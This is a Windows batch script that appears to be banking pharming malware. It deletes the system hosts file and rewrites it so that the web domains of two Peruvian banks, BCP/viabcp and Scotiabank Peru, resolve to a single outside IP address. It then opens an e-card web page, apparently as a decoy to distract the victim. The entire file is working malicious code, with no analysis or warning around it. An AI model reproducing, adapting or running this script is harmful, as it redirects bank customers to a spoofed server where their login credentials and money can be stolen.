@echo off
del "%windir%\system32\drivers\etc\hosts"
echo 127.0.0.1  locahost >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  www.bcp.com.pe >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  www.viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  www.viabcp.com.pe >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  bcp.com.pe >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  viabcp.com.pe >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  bcpzonasegura.viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  www.scotiabank.com >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  www.scotiabank.com.pe >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  scotiabank.com >> %windir%\system32\drivers\etc\hosts
echo 64.32.13.148  scotiabank.com.pe >> %windir%\system32\drivers\etc\hosts

start http://www.postales.com/ver_postal.php?view=PO48eab9ab5a308
exit
